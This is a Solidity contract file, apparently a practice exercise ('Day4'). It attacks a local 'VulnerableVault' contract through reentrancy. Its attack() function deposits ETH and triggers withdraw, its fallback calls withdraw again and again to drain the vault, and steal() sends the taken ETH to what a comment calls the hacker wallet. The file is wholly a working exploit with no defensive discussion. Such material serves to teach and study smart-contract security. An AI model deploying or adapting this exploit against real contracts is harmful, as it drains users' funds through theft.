// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./Day4_VulnerableVault.sol";

contract Day4_Attacker {
    Day4_VulnerableVault public vault;

    constructor(address _vaultAddress) {
        vault = Day4_VulnerableVault(_vaultAddress);
    }

    // 🧨 Step 1: Deposit ETH
    function attack() public payable {
        require(msg.value >= 1 ether, "Send at least 1 ETH");
        vault.deposit{value: msg.value}();
        vault.withdraw(); // 🧨 Triggers reentrancy
    }

    // 🌀 Step 2: fallback keeps calling withdraw again & again
    fallback() external payable {
        if (address(vault).balance >= 1 ether) {
            vault.withdraw();
        }
    }

    // Withdraw stolen ETH to hacker wallet
    function steal() public {
        payable(msg.sender).transfer(address(this).balance);
    }
}
